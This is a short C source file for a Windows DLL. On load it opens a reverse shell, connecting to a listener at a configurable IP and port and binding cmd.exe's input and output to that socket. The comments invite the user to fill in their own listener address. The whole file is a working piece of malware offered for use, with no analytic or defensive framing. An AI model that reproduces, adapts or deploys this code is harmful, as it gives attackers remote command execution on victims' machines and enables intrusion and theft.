// reverse_shell.c
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib,"ws2_32")

#define REMOTE_IP "192.168.1.100"  // 🔧 Change this to your listener IP
#define REMOTE_PORT 4444           // 🔧 Change this to your listener port

DWORD WINAPI ReverseShell(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char *cmd = "cmd.exe";

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(REMOTE_PORT);
    server.sin_addr.s_addr = inet_addr(REMOTE_IP);

    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), 0, 0, 0, 0) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ReverseShell, NULL, 0, NULL);
    }
    return TRUE;
}